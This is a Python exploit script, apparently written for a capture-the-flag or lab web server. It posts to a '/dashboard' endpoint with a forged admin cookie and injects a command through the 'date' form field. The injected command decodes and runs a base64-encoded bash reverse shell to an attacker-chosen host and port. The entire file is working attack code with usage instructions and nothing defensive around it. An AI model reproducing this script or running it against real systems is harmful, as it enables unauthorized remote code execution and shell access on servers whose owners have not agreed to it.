import sys
import requests
import base64
from colorama import Fore, Style

def generate_payload(lhost, lport):
    print(Fore.BLUE + "[*] Generating payload..." + Style.RESET_ALL)
    cmd = f"/bin/bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    return base64.b64encode(cmd.encode()).decode()

def send_req(server_ip, payload):
    print(Fore.BLUE + "[*] Sending to server..." + Style.RESET_ALL)
    url = f"http://{server_ip}:5000/dashboard"
    cookies = {"is_admin": "ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0"}
    data = {"date": f"2023-09-15;echo {payload} | base64 -d | bash"}
    try:
        r = requests.post(url, data=data, cookies=cookies, timeout=(5,5))
    except requests.Timeout:
        pass
    except requests.RequestException as e:
        print(Fore.RED + "[-] Something went wrong." + Style.RESET_ALL)
        print(Fore.RED + f"[-] Error: {e}" + Style.RESET_ALL)
    
    print(Fore.GREEN + "[+] Payload sent. Check your listener" + Style.RESET_ALL)
    return

def main():
    if len(sys.argv) != 4:
        print(Fore.RED + "[-] Usage: python exploit.py <SERVER_IP> <LHOST> <LPORT>" + Style.RESET_ALL)
        exit(0)
    
    server_ip = sys.argv[1]
    lhost = sys.argv[2]
    lport = sys.argv[3]

    payload = generate_payload(lhost, lport)
    print(Fore.BLUE + f"[*] Base64 payload: {payload}" + Style.RESET_ALL)
    send_req(server_ip, payload)

if __name__ == "__main__":
    main()